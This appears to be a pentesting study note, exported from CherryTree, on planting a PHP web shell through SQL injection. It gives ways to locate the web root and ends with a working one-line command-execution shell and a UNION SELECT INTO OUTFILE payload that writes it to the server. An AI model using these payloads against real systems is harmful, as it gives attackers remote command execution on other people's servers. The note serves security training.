<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Write a WebShell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Write a WebShell</h1><br/><br /><br /><br /><strong>PHP Webshell</strong><br /><br />To write files, we must know the base web directory for the web server (i.e. web root).<br />• One way to find it is to use load_file to read the server configuration, like Apache&#39;s configuration found at /etc/apache2/apache2.conf, Nginx&#39;s configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations.<br />• Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using:<br />   ◇ wordlist for Linux: <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt</a><br />   ◇ wordlist for Windows: <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt</a><br />• Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.<br /><br /><br /><br /><div class="codebox"><pre>&lt;?php system($_REQUEST[0]); ?&gt;</pre></div><br /><span style="color:#a52a2a;">examples of how to use this query during exploitation:</span><br />    <div class="codebox"><pre>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -</pre></div><br />    <a href=""><img src="images/2518-1.png" alt="images/2518-1.png" /></a></div>
</body>
</html>
